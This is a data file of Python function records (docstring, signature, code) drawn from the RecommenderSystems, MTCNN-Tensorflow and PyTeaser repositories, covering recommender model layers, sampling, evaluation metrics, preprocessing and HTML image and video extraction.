{"docstring": "\"\"\"Get and save ground truth image database\n\nParameters:\n----------\nReturns:\n-------\ngt_imdb: dict\n    image database with annotations\n\"\"\"\n# cache_file = os.path.join(self.cache_path, self.name + '_gt_roidb.pkl')\n# if os.path.exists(cache_file):\n#    with open(cache_file, 'rb') as f:\n#        imdb = cPickle.load(f)\n#    print '{} gt imdb loaded from {}'.format(self.name, cache_file)\n#    return imdb\n", "func_signal": "def gt_imdb(self):\n", "code": "gt_imdb = self.load_annotations()\n# with open(cache_file, 'wb') as f:\n#    cPickle.dump(gt_imdb, f, cPickle.HIGHEST_PROTOCOL)\nreturn gt_imdb", "path": "MTCNN-Tensorflow/test/imdb.py", "commit_date": "2017-08-31 00:00:00", "repo_name": "AITTSMD/MTCNN-Tensorflow", "stars": 1498, "license": "None", "language": "python", "size": 125859}
{"docstring": "'''\nArgs:\ninputs: sequence embeddings (item_embeddings +  pos_embeddings) shape: (batch_size , maxlen, embedding_size)\nReturn:\nOutput sequences which has the same shape with inputs\n'''\n", "func_signal": "def __call__(self, inputs, mask):\n", "code": "if self.pos_fixed: # use sin /cos positional embedding\n    position_encoding = self.get_position_encoding(inputs) # (batch_size, len, num_units)\nelse:\n    position_encoding = self.position_embedding(tf.tile(tf.expand_dims(tf.range(tf.shape(inputs)[1]), 0), [tf.shape(inputs)[0], 1]), self.maxlen, self.num_units, self.l2_reg)\ninputs += position_encoding\ninputs *= mask\nfor i in range(self.num_blocks):\n    with tf.variable_scope(\"num_blocks_%d\" % i):\n        # Self-attention\n        inputs = multihead_attention(queries=normalize(inputs),\n                                       keys=inputs,\n                                       num_units=self.num_units,\n                                       num_heads=self.num_heads,\n                                       dropout_keep_prob=self.dropout_keep_prob,\n                                       causality=True,\n                                       scope=\"self_attention\")\n\n        # Feed forward\n        inputs = feedforward(normalize(inputs), num_units=[self.num_units, self.num_units],\n                               dropout_keep_prob=self.dropout_keep_prob)\n\n        inputs *= mask\noutputs = normalize(inputs)  # (batch_size, maxlen, num_units)\nreturn outputs", "path": "RecommenderSystems/sequentialRec/neural/base.py", "commit_date": "2019-03-28 00:00:00", "repo_name": "DeepGraphLearning/RecommenderSystems", "stars": 1057, "license": "mit", "language": "python", "size": 51205}
{"docstring": "# Define placeholders\n", "func_signal": "def construct_placeholders(args):\n", "code": "placeholders = {\n    'input_x': tf.placeholder(tf.int32, shape=(args.batch_size, args.max_length), name='input_session'),\n    'input_y': tf.placeholder(tf.int32, shape=(args.batch_size, args.max_length), name='output_session'),\n    'mask_y': tf.placeholder(tf.float32, shape=(args.batch_size, args.max_length), name='mask_x'),\n    'support_nodes_layer1': tf.placeholder(tf.int32, shape=(args.batch_size*args.samples_1*args.samples_2), name='support_nodes_layer1'),\n    'support_nodes_layer2': tf.placeholder(tf.int32, shape=(args.batch_size*args.samples_2), name='support_nodes_layer2'),\n    'support_sessions_layer1': tf.placeholder(tf.int32, shape=(args.batch_size*args.samples_1*args.samples_2,\\\n                                args.max_length), name='support_sessions_layer1'),\n    'support_sessions_layer2': tf.placeholder(tf.int32, shape=(args.batch_size*args.samples_2,\\\n                                args.max_length), name='support_sessions_layer2'),\n    'support_lengths_layer1': tf.placeholder(tf.int32, shape=(args.batch_size*args.samples_1*args.samples_2), \n                                name='support_lengths_layer1'),\n    'support_lengths_layer2': tf.placeholder(tf.int32, shape=(args.batch_size*args.samples_2), \n                                name='support_lengths_layer2'),\n}\nreturn placeholders", "path": "RecommenderSystems/socialRec/dgrec/test.py", "commit_date": "2019-03-28 00:00:00", "repo_name": "DeepGraphLearning/RecommenderSystems", "stars": 1057, "license": "mit", "language": "python", "size": 51205}
{"docstring": "# Define placeholders\n", "func_signal": "def construct_placeholders(args):\n", "code": "placeholders = {\n    'input_x': tf.placeholder(tf.int32, shape=(args.batch_size, args.max_length), name='input_session'),\n    'input_y': tf.placeholder(tf.int32, shape=(args.batch_size, args.max_length), name='output_session'),\n    'mask_y': tf.placeholder(tf.float32, shape=(args.batch_size, args.max_length), name='mask_x'),\n    'support_nodes_layer1': tf.placeholder(tf.int32, shape=(args.batch_size*args.samples_1*args.samples_2), name='support_nodes_layer1'),\n    'support_nodes_layer2': tf.placeholder(tf.int32, shape=(args.batch_size*args.samples_2), name='support_nodes_layer2'),\n    'support_sessions_layer1': tf.placeholder(tf.int32, shape=(args.batch_size*args.samples_1*args.samples_2,\\\n                                args.max_length), name='support_sessions_layer1'),\n    'support_sessions_layer2': tf.placeholder(tf.int32, shape=(args.batch_size*args.samples_2,\\\n                                args.max_length), name='support_sessions_layer2'),\n    'support_lengths_layer1': tf.placeholder(tf.int32, shape=(args.batch_size*args.samples_1*args.samples_2), \n                                name='support_lengths_layer1'),\n    'support_lengths_layer2': tf.placeholder(tf.int32, shape=(args.batch_size*args.samples_2), \n                                name='support_lengths_layer2'),\n}\nreturn placeholders", "path": "RecommenderSystems/socialRec/dgrec/train.py", "commit_date": "2019-03-28 00:00:00", "repo_name": "DeepGraphLearning/RecommenderSystems", "stars": 1057, "license": "mit", "language": "python", "size": 51205}
{"docstring": "'''\n:param user_id: int\n:param target: list of int\n:param prediction:  list of int\n:return:\n'''\n", "func_signal": "def eval(self, user_id, target, prediction):\n", "code": "ranking = {}\nnum_hits = 0.\nap_score = 0.\n\nP = np.zeros_like(self.k, dtype=np.float32)\nfor idx, item in enumerate(prediction):\n    ranking[item] = idx + 1\n    if item in target:\n        for i, k in enumerate(self.k):\n            if idx < k:\n                P[i] += 1.0     # the predicted item is in top-k (Precise@K)\n    if item in target and item not in prediction[:idx]:\n        num_hits += 1.0\n        ap_score += num_hits / (idx + 1.0)\n\nfor i, k in enumerate(self.k):\n    P[i] /= float(k)            # Precise@K should be divided by K\n    \nself.P = self.P + P\n\nap_score /= float(len(prediction))\nself.MAP.append(ap_score)\n\nR = np.zeros_like(self.k, dtype=np.float32)\nndcg = 0\nfor idx, item in enumerate(target):\n    for i, k in enumerate(self.k):\n        if item in prediction[:k]:\n            R[i] += 1           # the target is in top-k prediction (Recall@K)\n    if ranking.get(item, 1e9) <= self.ndcg_cutoff:\n        ndcg += 1.0 / np.log2(1.0 + ranking[item])\nndcg /= float(len(target))\nself.NDCG.append(ndcg)\n\nR = R / float(len(target))      # Recall@K should be divided by number of targets\nself.R = self.R + R", "path": "RecommenderSystems/sequentialRec/neural/eval.py", "commit_date": "2019-03-28 00:00:00", "repo_name": "DeepGraphLearning/RecommenderSystems", "stars": 1057, "license": "mit", "language": "python", "size": 51205}
{"docstring": "'''\np: positive one\nn: number of items\ns: size of samples.\n'''\n", "func_signal": "def random_neg(pos, n, s):\n", "code": "neg = set()\nfor _ in range(s):\n    t = np.random.randint(1, n+1)\n    while t in pos or t in neg:\n        t = np.random.randint(1, n+1)\n    neg.add(t)\nreturn list(neg)", "path": "RecommenderSystems/sequentialRec/markovChains/sampler.py", "commit_date": "2019-03-28 00:00:00", "repo_name": "DeepGraphLearning/RecommenderSystems", "stars": 1057, "license": "mit", "language": "python", "size": 51205}
{"docstring": "\"\"\"All zeros.\"\"\"\n", "func_signal": "def zeros(shape, name=None):\n", "code": "initial = tf.zeros(shape, dtype=tf.float32)\nreturn tf.Variable(initial, name=name)", "path": "RecommenderSystems/socialRec/dgrec/inits.py", "commit_date": "2019-03-28 00:00:00", "repo_name": "DeepGraphLearning/RecommenderSystems", "stars": 1057, "license": "mit", "language": "python", "size": 51205}
{"docstring": "\"\"\"\n:param Xi: list of list of feature indices of each sample in the dataset\n:param Xv: list of list of feature values of each sample in the dataset\n:return: predicted probability of each sample\n\"\"\"\n# dummy y\n", "func_signal": "def predict(self, Xi, Xv):\n", "code": "dummy_y = [1] * len(Xi)\nbatch_index = 0\nXi_batch, Xv_batch, y_batch = self.get_batch(Xi, Xv, dummy_y, self.batch_size, batch_index)\ny_pred = None\nwhile len(Xi_batch) > 0:\n    num_batch = len(y_batch)\n    feed_dict = {self.feat_index: Xi_batch,\n                 self.feat_value: Xv_batch,\n                 self.label: y_batch,\n                 self.dropout_keep_prob: [1.0] * len(self.drop_keep_prob),\n                 self.train_phase: False}\n    batch_out = self.sess.run(self.out, feed_dict=feed_dict)\n\n    if batch_index == 0:\n        y_pred = np.reshape(batch_out, (num_batch,))\n    else:\n        y_pred = np.concatenate((y_pred, np.reshape(batch_out, (num_batch,))))\n\n    batch_index += 1\n    Xi_batch, Xv_batch, y_batch = self.get_batch(Xi, Xv, dummy_y, self.batch_size, batch_index)\n\nreturn y_pred", "path": "RecommenderSystems/featureRec/autoint/model.py", "commit_date": "2019-03-28 00:00:00", "repo_name": "DeepGraphLearning/RecommenderSystems", "stars": 1057, "license": "mit", "language": "python", "size": 51205}
{"docstring": "'''\nThe model can be applied for session-based recommendation, where a sequence is seen as a user's history.\nThe data should contain three columns, i.e., SessionId, ItemId and Time with Tab as separator.\n'''\n", "func_signal": "def preprocess_session(dname):\n", "code": "data = pd.read_csv(data_path + dname + '/' + dname + '.tsv', sep='\\t', header=None)\ndata.columns = ['SessionId', 'ItemId', 'Time']\nsession_lengths = data.groupby('SessionId').size()\ndata = data[np.in1d(data.SessionId, session_lengths[session_lengths>2].index)]\n\nitem_supports = data.groupby('ItemId').size()\ndata = data[np.in1d(data.ItemId, item_supports[item_supports>=10].index)]\nprint('Unique items: {}'.format(data.ItemId.nunique()))\n    \nsession_lengths = data.groupby('SessionId').size()\nprint('Average session length: {}'.format(session_lengths.mean()))\ndata = data[np.in1d(data.SessionId, session_lengths[session_lengths>2].index)]\n\nsession_lengths = data.groupby('SessionId').size()\nprint('Average session length after removing sessions with less than two event: {}'.format(session_lengths.mean()))\n\nsession_max_times = data.groupby('SessionId').Time.max()\ntmax = data.Time.max()\nsession_train = session_max_times[session_max_times < tmax-86400*2].index # We preserve sessions of last two days as validation and test data\nsession_test = session_max_times[session_max_times >= tmax-86400*2].index\ntrain = data[np.in1d(data.SessionId, session_train)]\ntest = data[np.in1d(data.SessionId, session_test)]\ntest = test[np.in1d(test.ItemId, train.ItemId)]\n\ntslength = test.groupby('SessionId').size()\ntest = test[np.in1d(test.SessionId, tslength[tslength>2].index)]\n\ntest_session = test.SessionId.unique()\ntest_session_ = np.random.choice(test_session, int(len(test_session) / 2), replace=False)\ntest_ = test.loc[test['SessionId'].isin(test_session_)]\nval_ = test.loc[~test['SessionId'].isin(test_session_)]\nprint('Train size: {}'.format(len(train)))\nprint('Dev size: {}'.format(len(val_)))\nprint('Test size: {}'.format(len(test_)))\n\ncolumns = ['SessionId', 'ItemId', 'Time']\nheader = ['UserId', 'ItemId', 'Time']\ntrain.to_csv(data_path + dname + '/' + dname + '_train_tr.txt', sep='\\t', columns=columns, header=header, index=False)\ntest_.to_csv(data_path + dname + '/' + dname + '_test.txt', sep='\\t',columns=columns, header=header, index=False)\nval_.to_csv(data_path + dname + '/' + dname + '_train_valid.txt', sep='\\t', columns=columns, header=header, index=False)", "path": "RecommenderSystems/sequentialRec/neural/utils.py", "commit_date": "2019-03-28 00:00:00", "repo_name": "DeepGraphLearning/RecommenderSystems", "stars": 1057, "license": "mit", "language": "python", "size": 51205}
{"docstring": "'''\np: positive one\nn: number of items\ns: size of samples.\n'''\n", "func_signal": "def random_neg(pos, n, s):\n", "code": "neg = set()\nfor _ in range(s):\n    t = np.random.randint(1, n+1)\n    while t in pos or t in neg:\n        t = np.random.randint(1, n+1)\n    neg.add(t)\nreturn list(neg)", "path": "RecommenderSystems/sequentialRec/neural/sampler.py", "commit_date": "2019-03-28 00:00:00", "repo_name": "DeepGraphLearning/RecommenderSystems", "stars": 1057, "license": "mit", "language": "python", "size": 51205}
{"docstring": "'''\ndata: list of train data, key: user, value: a set of all user's clicks.\ntensors: list of train tensors, each element of list is also a list.\nmasks: list of train masks, each element of list is also a list.\nbatch_size: number of samples in a batch.\nneg_size: number of negative samples.\n'''\n", "func_signal": "def sample_function(data, n_items, n_users, batch_size, max_len, neg_size, result_queue, SEED, neg_method='rand'):\n", "code": "num_samples = np.array([len(data[str(u)]) for u in range(1, n_users+1)])\nprob_ = num_samples / (1.0 * np.sum(num_samples))\ndef sample():\n    '''\n    # sample a user based on behavior frequency.\n    #TODO: more efficient non-uniform sampling method.\n    Compute utility lists for non-uniform sampling from discrete distributions.\n    Refer to https://hips.seas.harvard.edu/blog/2013/03/03/the-alias-method-efficient-sampling-with-many-discrete-outcomes/\n    for details\n    '''\n    \n    user = np.random.choice(a=range(1,1+n_users), p=prob_)\n    u = str(user)\n\n    # sample a slice from user u randomly. \n    idx = np.random.randint(1, len(data[u]))\n    start = 0 if idx >= max_len else max_len - idx\n    len_of_item = max_len - start\n\n    # Assume max_len is set to 5, and we want to predict the 4-th entry in the sequence\n    # Then the length of historical items is 3.\n    # The following code will return the array like [0, 0, x, x, x]\n    # i.e. the zero is padded to the left.\n    seq = np.zeros([max_len], dtype=np.int32)\n    seq[start:] = data[u][idx-len_of_item:idx]\n\n\n    pos = data[u][idx]\n    neg = np.zeros([neg_size], dtype=np.int32)\n\n\n    if neg_method == 'rand':\n        neg = random_neg([pos], n_items, neg_size)\n    else:\n        raise NotImplementedError\n\n\n    return (user, seq, pos, neg)\n\nnp.random.seed(SEED)\nwhile True:\n    one_batch = []\n    for i in range(batch_size):\n        one_batch.append(sample())\n    result_queue.put(list(zip(*one_batch)))", "path": "RecommenderSystems/sequentialRec/markovChains/sampler.py", "commit_date": "2019-03-28 00:00:00", "repo_name": "DeepGraphLearning/RecommenderSystems", "stars": 1057, "license": "mit", "language": "python", "size": 51205}
{"docstring": "\"\"\"Glorot & Bengio (AISTATS 2010) init.\"\"\"\n", "func_signal": "def glorot(shape, name=None):\n", "code": "init_range = np.sqrt(6.0/(shape[0]+shape[1]))\ninitial = tf.random_uniform(shape, minval=-init_range, maxval=init_range, dtype=tf.float32)\nreturn tf.Variable(initial, name=name)", "path": "RecommenderSystems/socialRec/dgrec/inits.py", "commit_date": "2019-03-28 00:00:00", "repo_name": "DeepGraphLearning/RecommenderSystems", "stars": 1057, "license": "mit", "language": "python", "size": 51205}
{"docstring": "'''\ndata: list of train data, key: user, value: a set of all user's clicks.\ntensors: list of train tensors, each element of list is also a list.\nmasks: list of train masks, each element of list is also a list.\nbatch_size: number of samples in a batch.\nneg_size: number of negative samples.\n'''\n", "func_signal": "def sample_function(data, n_items, n_users, batch_size, max_len, neg_size, result_queue, SEED, neg_method='rand'):\n", "code": "num_samples = np.array([len(data[str(u)]) for u in range(1, n_users+1)])\nprob_ = num_samples / (1.0 * np.sum(num_samples))\ndef sample():\n    # sample a user based on behavior frequency.\n    user = np.random.choice(a=range(1,1+n_users), p=prob_)\n    u = str(user)\n\n    # sample a slice from user u randomly. \n    if len(data[u]) <= max_len:\n        idx = 0\n    else:\n        idx = np.random.randint(0, len(data[u])-max_len+1)\n    seq = np.zeros([max_len], dtype=np.int32)\n    for i, itemid in enumerate(data[u][idx:idx+max_len]):\n        seq[i] = itemid\n\n    pos = np.zeros([max_len], dtype=np.int32)\n    neg = np.zeros([max_len, neg_size], dtype=np.int32)\n    l = len(data[u]) - idx - 1\n    l = min(l, max_len)\n    for j in range(l):\n        pos[j] = data[u][idx+1+j]\n        if neg_method == 'rand':\n            neg[j,:] = random_neg([pos[j]], n_items, neg_size)\n        else: # Currently we only support random negative samples.\n            raise NotImplementedError\n    return (user, seq, pos, neg)\n\nnp.random.seed(SEED)\nwhile True:\n    one_batch = []\n    for i in range(batch_size):\n        one_batch.append(sample())\n    result_queue.put(list(zip(*one_batch)))", "path": "RecommenderSystems/sequentialRec/neural/sampler.py", "commit_date": "2019-03-28 00:00:00", "repo_name": "DeepGraphLearning/RecommenderSystems", "stars": 1057, "license": "mit", "language": "python", "size": 51205}
{"docstring": "\"\"\"Helper function, assigns unique layer IDs.\"\"\"\n", "func_signal": "def get_layer_uid(layer_name=''):\n", "code": "if layer_name not in _LAYER_UIDS:\n    _LAYER_UIDS[layer_name] = 1\n    return 1\nelse:\n    _LAYER_UIDS[layer_name] += 1\n    return _LAYER_UIDS[layer_name]", "path": "RecommenderSystems/socialRec/dgrec/layers.py", "commit_date": "2019-03-28 00:00:00", "repo_name": "DeepGraphLearning/RecommenderSystems", "stars": 1057, "license": "mit", "language": "python", "size": 51205}
{"docstring": "'''\ninputs: the embeddings of a batch of sequences. (batch_size, seq_length, emb_size)\nmask: mask for imcomplete sequences. (batch_size, seq_length, 1)\n'''\n", "func_signal": "def __call__(self, inputs, mask):\n", "code": "cells = []\nfor _ in range(self.layers):\n    cell = rnn.BasicLSTMCell(self.hidden_units, activation=self.hidden_activation)\n    cell = rnn.DropoutWrapper(cell, output_keep_prob=1.-self.dropout)\n    cells.append(cell)\nself.cell = cell = rnn.MultiRNNCell(cells)\nzero_state = cell.zero_state(tf.shape(inputs)[0], dtype=tf.float32)\nsequence_length = tf.count_nonzero(tf.squeeze(mask, [-1]), -1)\noutputs, state = tf.nn.dynamic_rnn(cell, inputs, sequence_length=sequence_length, initial_state=zero_state)\nreturn outputs", "path": "RecommenderSystems/sequentialRec/neural/base.py", "commit_date": "2019-03-28 00:00:00", "repo_name": "DeepGraphLearning/RecommenderSystems", "stars": 1057, "license": "mit", "language": "python", "size": 51205}
{"docstring": "\"\"\"Uniform init.\"\"\"\n", "func_signal": "def uniform(shape, scale=0.05, name=None):\n", "code": "initial = tf.random_uniform(shape, minval=-scale, maxval=scale, dtype=tf.float32)\nreturn tf.Variable(initial, name=name)", "path": "RecommenderSystems/socialRec/dgrec/inits.py", "commit_date": "2019-03-28 00:00:00", "repo_name": "DeepGraphLearning/RecommenderSystems", "stars": 1057, "license": "mit", "language": "python", "size": 51205}
{"docstring": "'''\nUse the same rnn in decode function\n'''\n", "func_signal": "def local_features(self):\n", "code": "initial_state_layer1 = self.lstm_cell.zero_state(self.batch_size*self.samples_1*self.samples_2, dtype=tf.float32)\ninitial_state_layer2 = self.lstm_cell.zero_state(self.batch_size*self.samples_2, dtype=tf.float32)\ninputs_1 = tf.nn.embedding_lookup(self.embedding, self.support_sessions_layer1)\ninputs_2 = tf.nn.embedding_lookup(self.embedding, self.support_sessions_layer2)\noutputs1, states1 = tf.nn.dynamic_rnn(cell=self.lstm_cell,\n                                    inputs=inputs_1, \n                                    sequence_length=self.support_lengths_layer1,\n                                    initial_state=initial_state_layer1,\n                                    dtype=tf.float32)\noutputs2, states2 = tf.nn.dynamic_rnn(cell=self.lstm_cell,\n                                    inputs=inputs_2, \n                                    sequence_length=self.support_lengths_layer2,\n                                    initial_state=initial_state_layer2,\n                                    dtype=tf.float32)\n# outputs: shape[batch_size, max_time, depth]\nlocal_layer1 = states1.h\nlocal_layer2 = states2.h\ndense_layer = Dense(self.hidden_size, \n                    self.hidden_size if self.local_only else self.hidden_size // 2,\n                    act=tf.nn.relu,\n                    dropout=self.dropout if self.training else 0.)\nself.dense_layers.append(dense_layer)\nlocal_layer1 = dense_layer(local_layer1)\nlocal_layer2 = dense_layer(local_layer2)\nreturn [local_layer2, local_layer1]", "path": "RecommenderSystems/socialRec/dgrec/model.py", "commit_date": "2019-03-28 00:00:00", "repo_name": "DeepGraphLearning/RecommenderSystems", "stars": 1057, "license": "mit", "language": "python", "size": 51205}
{"docstring": "\"\"\"All ones.\"\"\"\n", "func_signal": "def ones(shape, name=None):\n", "code": "initial = tf.ones(shape, dtype=tf.float32)\nreturn tf.Variable(initial, name=name)", "path": "RecommenderSystems/socialRec/dgrec/inits.py", "commit_date": "2019-03-28 00:00:00", "repo_name": "DeepGraphLearning/RecommenderSystems", "stars": 1057, "license": "mit", "language": "python", "size": 51205}
{"docstring": "#global features\n", "func_signal": "def global_and_local_features(self):\n", "code": "global_feature_layer2, global_feature_layer1 = self.global_features()\nlocal_feature_layer2, local_feature_layer1 = self.local_features()\nglobal_local_layer2 = tf.concat([global_feature_layer2, local_feature_layer2], -1)\nglobal_local_layer1 = tf.concat([global_feature_layer1, local_feature_layer1], -1)\nreturn [global_local_layer2, global_local_layer1]", "path": "RecommenderSystems/socialRec/dgrec/model.py", "commit_date": "2019-03-28 00:00:00", "repo_name": "DeepGraphLearning/RecommenderSystems", "stars": 1057, "license": "mit", "language": "python", "size": 51205}
{"docstring": "'''\nFor sequential recommendation.\nThe data should contain three columns, i.e., user, item and Time with Tab as separator.\n'''\n", "func_signal": "def preprocess_sequence(dname):\n", "code": "data = pd.read_csv(data_path + dname + '/' + dname + '.tsv', sep='\\t', header=None)\ndata.columns = ['user', 'item', 'Time']\n\nevent_lengths = data.groupby('user').size()\nprint('Average check-ins per user: {}'.format(event_lengths.mean()))\ndata = data[np.in1d(data.user, event_lengths[event_lengths>10].index)]\n\nitem_supports = data.groupby('item').size()\n# 50 for delicious, 10 for gowalla\ndata = data[np.in1d(data.item, item_supports[item_supports>=10].index)]\nprint('Unique items: {}'.format(data.item.nunique()))\n\nevent_lengths = data.groupby('user').size()\ndata = data[np.in1d(data.user, event_lengths[event_lengths>=10].index)]\n\nevent_lengths = data.groupby('user').size()\nprint('Average check-ins per user after removing sessions with one event: {}'.format(event_lengths.mean()))\n\ntmin = data.Time.min()\ntmax = data.Time.max()\npivot = (tmax-tmin) * 0.9 + tmin # Preserve last 10% as validation and test data\ntrain = data.loc[data['Time'] < pivot]\ntest = data.loc[data['Time'] >= pivot]\n\ntr_event_lengths = train.groupby('user').size()\ntrain = train[np.in1d(train.user, tr_event_lengths[tr_event_lengths>3].index)]\nprint('Average (train) check-ins per user: {}'.format(tr_event_lengths.mean()))\n\nuser_to_predict = train.user.unique()\ntest = test[test['user'].isin(user_to_predict)]\nitem_to_predict = train.item.unique()\ntest = test[test['item'].isin(item_to_predict)]\ntest_event_lengths = test.groupby('user').size()\ntest = test[np.in1d(test.user, test_event_lengths[test_event_lengths>3].index)]\nprint('Average (test) check-ins per user: {}'.format(test_event_lengths.mean()))\n\n   \ntest_user = test.user.unique()\ntest_user_ = np.random.choice(test_user, int(len(test_user) / 2), replace=False)\ntest_ = test.loc[test['user'].isin(test_user_)]\nval_ = test.loc[~test['user'].isin(test_user_)]\nprint('Train size: {}'.format(len(train)))\nprint('Dev size: {}'.format(len(val_)))\nprint('Test size: {}'.format(len(test_)))\n\n  \ncolumns = ['user', 'item', 'Time']\nheader = ['UserId', 'ItemId', 'Time']\ntrain.to_csv(data_path + dname + '/' + dname + '_train_tr.txt', sep='\\t', columns=columns, header=header, index=False)\ntest_.to_csv(data_path + dname + '/' + dname + '_test.txt', sep='\\t',columns=columns, header=header, index=False)\nval_.to_csv(data_path + dname + '/' + dname + '_train_valid.txt', sep='\\t', columns=columns, header=header, index=False)", "path": "RecommenderSystems/sequentialRec/neural/utils.py", "commit_date": "2019-03-28 00:00:00", "repo_name": "DeepGraphLearning/RecommenderSystems", "stars": 1057, "license": "mit", "language": "python", "size": 51205}
{"docstring": "\"\"\"\n:param Xi: list of list of feature indices of each sample in the dataset\n:param Xv: list of list of feature values of each sample in the dataset\n:param y: label of each sample in the dataset\n:return: metric of the evaluation\n\"\"\"\n", "func_signal": "def evaluate(self, Xi, Xv, y):\n", "code": "y_pred = self.predict(Xi, Xv)\ny_pred = np.clip(y_pred,1e-6,1-1e-6)\nreturn self.eval_metric(y, y_pred), log_loss(y, y_pred)", "path": "RecommenderSystems/featureRec/autoint/model.py", "commit_date": "2019-03-28 00:00:00", "repo_name": "DeepGraphLearning/RecommenderSystems", "stars": 1057, "license": "mit", "language": "python", "size": 51205}
{"docstring": "\"\"\"\\\nchecks to see if we were able to\nfind open graph tags on this page\n\"\"\"\n", "func_signal": "def check_opengraph_tag(self):\n", "code": "node = self.article.raw_doc\nmeta = self.parser.getElementsByTag(node, tag='meta', attr='property', value='og:image')\nfor item in meta:\n    src = self.parser.getAttribute(item, attr='content')\n    if src:\n        return self.get_image(item, src, extraction_type='opengraph')\nreturn None", "path": "PyTeaser/goose/images/extractors.py", "commit_date": "2013-12-15 00:00:00", "repo_name": "xiaoxu193/PyTeaser", "stars": 1171, "license": "mit", "language": "python", "size": 993}
{"docstring": "\"\"\"get the top 10 keywords and their frequency scores\nignores blacklisted words in stopWords,\ncounts the number of occurrences of each word\n\"\"\"\n", "func_signal": "def keywords(text):\n", "code": "text = split_words(text)\nnumWords = len(text)  # of words before removing blacklist words\nfreq = Counter(x for x in text if x not in stopWords)\n\nminSize = min(10, len(freq))  # get first 10\nkeywords = {x: y for x, y in freq.most_common(minSize)}  # recreate a dict\n\nfor k in keywords:\n    articleScore = keywords[k]*1.0 / numWords\n    keywords[k] = articleScore * 1.5 + 1\n\nreturn keywords", "path": "PyTeaser/pyteaser.py", "commit_date": "2015-01-16 00:00:00", "repo_name": "xiaoxu193/PyTeaser", "stars": 1171, "license": "mit", "language": "python", "size": 993}
{"docstring": "# article\n", "func_signal": "def __init__(self, article, config):\n", "code": "self.article = article\n\n# config\nself.config = config\n\n# parser\nself.parser = self.config.get_parser()\n\n# candidates\nself.candidates = []\n\n# movies\nself.movies = []", "path": "PyTeaser/goose/videos/extractors.py", "commit_date": "2013-12-15 00:00:00", "repo_name": "xiaoxu193/PyTeaser", "stars": 1171, "license": "mit", "language": "python", "size": 993}
{"docstring": "\"\"\"\\\nchecks to see if we were able to\nfind open link_src on this page\n\"\"\"\n", "func_signal": "def check_link_tag(self):\n", "code": "node = self.article.raw_doc\nmeta = self.parser.getElementsByTag(node, tag='link', attr='rel', value='image_src')\nfor item in meta:\n    src = self.parser.getAttribute(item, attr='href')\n    if src:\n        return self.get_image(item, src, extraction_type='linktag')\nreturn None", "path": "PyTeaser/goose/images/extractors.py", "commit_date": "2013-12-15 00:00:00", "repo_name": "xiaoxu193/PyTeaser", "stars": 1171, "license": "mit", "language": "python", "size": 993}
{"docstring": "\"\"\"\\\nin here we check for known image contains from sites\nwe've checked out like yahoo, techcrunch, etc... that have\n* known  places to look for good images.\n* TODO: enable this to use a series of settings files\n  so people can define what the image ids/classes\n  are on specific sites\n\"\"\"\n", "func_signal": "def check_known_elements(self):\n", "code": "domain = self.get_clean_domain()\nif domain in self.custom_site_mapping.keys():\n    classes = self.custom_site_mapping.get(domain).split('|')\n    for classname in classes:\n        KNOWN_IMG_DOM_NAMES.append(classname)\n\nimage = None\ndoc = self.article.raw_doc\n\ndef _check_elements(elements):\n    image = None\n    for element in elements:\n        tag = self.parser.getTag(element)\n        if tag == 'img':\n            image = element\n            return image\n        else:\n            images = self.parser.getElementsByTag(element, tag='img')\n            if images:\n                image = images[0]\n                return image\n    return image\n\n# check for elements with known id\nfor css in KNOWN_IMG_DOM_NAMES:\n    elements = self.parser.getElementsByTag(doc, attr=\"id\", value=css)\n    image = _check_elements(elements)\n    if image is not None:\n        src = self.parser.getAttribute(image, attr='src')\n        if src:\n            return self.get_image(image, src, score=90, extraction_type='known')\n\n# check for elements with known classes\nfor css in KNOWN_IMG_DOM_NAMES:\n    elements = self.parser.getElementsByTag(doc, attr='class', value=css)\n    image = _check_elements(elements)\n    if image is not None:\n        src = self.parser.getAttribute(image, attr='src')\n        if src:\n            return self.get_image(image, src, score=90, extraction_type='known')\n\nreturn None", "path": "PyTeaser/goose/images/extractors.py", "commit_date": "2013-12-15 00:00:00", "repo_name": "xiaoxu193/PyTeaser", "stars": 1171, "license": "mit", "language": "python", "size": 993}
{"docstring": "\"\"\"\nCreate a video object from a video embed\n\"\"\"\n", "func_signal": "def get_video(self, node):\n", "code": "video = Video()\nvideo.embed_code = self.get_embed_code(node)\nvideo.embed_type = self.get_embed_type(node)\nvideo.width = self.get_width(node)\nvideo.height = self.get_height(node)\nvideo.src = self.get_src(node)\nvideo.provider = self.get_provider(video.src)\nreturn video", "path": "PyTeaser/goose/videos/extractors.py", "commit_date": "2013-12-15 00:00:00", "repo_name": "xiaoxu193/PyTeaser", "stars": 1171, "license": "mit", "language": "python", "size": 993}
{"docstring": "# test if object tag has en embed child\n# in this case we want to remove the embed from\n# the candidate list to avoid parsing it twice\n", "func_signal": "def get_object_tag(self, node):\n", "code": "child_embed_tag = self.parser.getElementsByTag(node, 'embed')\nif child_embed_tag and child_embed_tag[0] in self.candidates:\n    self.candidates.remove(child_embed_tag[0])\n\n# get the object source\n# if wa don't have a src node don't coninue\nsrc_node = self.parser.getElementsByTag(node, tag=\"param\", attr=\"name\", value=\"movie\")\nif not src_node:\n    return None\n\nsrc = self.parser.getAttribute(src_node[0], \"value\")\n\n# check provider\nprovider = self.get_provider(src)\nif not provider:\n    return None\n\nvideo = self.get_video(node)\nvideo.provider = provider\nvideo.src = src\nreturn video", "path": "PyTeaser/goose/videos/extractors.py", "commit_date": "2013-12-15 00:00:00", "repo_name": "xiaoxu193/PyTeaser", "stars": 1171, "license": "mit", "language": "python", "size": 993}
{"docstring": "\"\"\"\nReturns a bytestring version of 's', encoded as specified in 'encoding'.\n\nIf strings_only is True, don't convert (some) non-string-like objects.\n\"\"\"\n", "func_signal": "def smart_str(s, encoding='utf-8', strings_only=False, errors='strict'):\n", "code": "if strings_only and isinstance(s, (types.NoneType, int)):\n    return s\n# if isinstance(s, Promise):\n#     return unicode(s).encode(encoding, errors)\nif not isinstance(s, basestring):\n    try:\n        return str(s)\n    except UnicodeEncodeError:\n        if isinstance(s, Exception):\n            # An Exception subclass containing non-ASCII data that doesn't\n            # know how to print itself properly. We shouldn't raise a\n            # further exception.\n            return ' '.join([smart_str(arg, encoding, strings_only,\n                    errors) for arg in s])\n        return unicode(s).encode(encoding, errors)\nelif isinstance(s, unicode):\n    return s.encode(encoding, errors)\nelif s and encoding != 'utf-8':\n    return s.decode('utf-8', errors).encode(encoding, errors)\nelse:\n    return s", "path": "PyTeaser/goose/utils/encoding.py", "commit_date": "2013-12-15 00:00:00", "repo_name": "xiaoxu193/PyTeaser", "stars": 1171, "license": "mit", "language": "python", "size": 993}
